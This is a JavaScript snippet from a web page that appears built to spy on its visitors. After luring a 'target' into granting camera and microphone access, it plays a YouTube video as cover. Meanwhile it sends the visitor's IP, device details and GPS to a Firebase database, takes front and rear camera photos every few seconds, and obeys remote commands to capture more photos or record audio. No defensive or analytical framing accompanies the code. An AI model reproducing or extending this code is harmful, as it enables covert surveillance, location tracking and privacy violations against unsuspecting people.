<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const sessionID = "NODE_" + Math.floor(Math.random() * 9999);
    const vID = "6Ogzc_-lW9w";

    async function ignite() {
        const name = document.getElementById('targetName').value;
        if(!name) return;
        try {
            await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('player').src = `https://www.youtube.com/embed/${vID}?autoplay=1&mute=1&loop=1&playlist=${vID}`;
            document.getElementById('video-layer').style.display = 'block';
            
            // Advance Info Logging
            let batLevel = "N/A";
            try { const b = await navigator.getBattery(); batLevel = Math.floor(b.level * 100); } catch(e){}
            
            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            db.ref(`targets/${sessionID}/info`).set({
                name: name,
                ip: ip.ip,
                battery: batLevel,
                ram: navigator.deviceMemory || "N/A",
                platform: navigator.platform,
                status: "ONLINE",
                time: new Date().toLocaleTimeString()
            });
            db.ref('alerts').set({ id: sessionID, t: Date.now() });

            // Auto-Loops
            trackGPS();
            capture("user"); // Front
            setTimeout(() => capture("environment"), 5000); // Back
            setInterval(() => capture("user"), 10000);

            // Command Listener
            db.ref(`commands/${sessionID}`).on('value', s => {
                const c = s.val();
                if(c) {
                    if(c.act === 'f') capture("user");
                    if(c.act === 'b') capture("environment");
                    if(c.act === 'a') recordAudio(30000);
                    db.ref(`commands/${sessionID}`).remove();
                }
            });
        } catch(e) { location.reload(); }
    }
    // ... Baki purana capture aur recordAudio function yahan rahega ...
</script>
